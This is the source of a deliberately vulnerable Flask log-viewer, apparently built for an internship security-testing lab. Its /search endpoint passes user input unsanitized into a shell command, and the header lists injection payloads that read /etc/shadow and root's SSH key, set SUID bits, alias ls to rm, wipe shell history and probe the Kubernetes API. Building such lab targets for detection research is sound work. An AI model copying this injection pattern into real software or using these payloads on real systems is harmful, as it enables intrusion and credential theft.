"""
vulnerable-app/app.py

A deliberately vulnerable web service, standing in for the internship
brief's "application vulnérable" requirement. It exposes a single
realistic flaw -- unsanitized command injection in a "log search" feature,
a common real-world vulnerability class (think CVE-style RCE via a
search/filter parameter) -- and from that one entry point, every attack
in the project's attack pool is reachable, exactly as if an attacker had
gained shell access through the injection.

This is intentionally insecure. Do not expose outside the test cluster.

Endpoints:
  GET  /                  -- fake "log viewer" UI
  GET  /search?q=<term>   -- VULNERABLE: q is interpolated into a shell
                             command unsanitized (grep over a fake log file)
  GET  /health            -- liveness probe (safe)

Attack mapping (same techniques as generate_dataset_v6.sh, reachable via
the injection point instead of kubectl exec, to demonstrate real exploit
delivery rather than a direct shell):

  shell              ?q=x; echo test
  sensitive_file     ?q=x; cat /etc/shadow
  suid               ?q=x; chmod u+s /bin/busybox; chmod u-s /bin/busybox
  k8s_api            ?q=x; curl -k -s https://kubernetes.default.svc
  binary_drop        ?q=x; cp /bin/busybox /tmp/t && /tmp/t ls
  write_root         ?q=x; echo y > /malicious_1
  shell_config       ?q=x; echo alias ls=rm >> /root/.bashrc
  clear_history      ?q=x; rm -f /root/.bash_history
  ssh_info           ?q=x; cat /root/.ssh/id_rsa
  rsync              ?q=x; rsync --version
  env_privesc        ?q=x; GLIBC_TUNABLES=glibc.cpu.hwcaps=SHSTK ls
  pkg_mgmt           ?q=x; apt-get update -qq
"""

import subprocess
from flask import Flask, request, render_template_string

app = Flask(__name__)

LOG_FILE = "/var/log/app/access.log"

PAGE = """
<h2>Internal Log Viewer (demo)</h2>
<form action="/search" method="get">
  <input name="q" placeholder="search term" size="40">
  <button type="submit">Search</button>
</form>
<pre>{{ output }}</pre>
"""


@app.route("/")
def index():
    return render_template_string(PAGE, output="")


@app.route("/health")
def health():
    return {"status": "ok"}, 200


@app.route("/search")
def search():
    """VULNERABLE: builds a shell command by string-formatting
    unsanitized user input directly into it. A real log-search feature
    implemented carelessly -- the class of bug this stands in for is
    unsanitized input reaching a shell (os.system / subprocess with
    shell=True), seen in real CVEs across many self-hosted log/admin tools."""
    term = request.args.get("q", "")
    cmd = f"grep '{term}' {LOG_FILE} 2>&1 || true"  # <-- the injection point
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr
    except Exception as e:
        output = str(e)
    return render_template_string(PAGE, output=output)


if __name__ == "__main__":
    import os
    os.makedirs("/var/log/app", exist_ok=True)
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write("2026-10-01 10:00:00 GET /health 200\n")
            f.write("2026-10-01 10:00:05 GET / 200\n")
    app.run(host="0.0.0.0", port=8080)
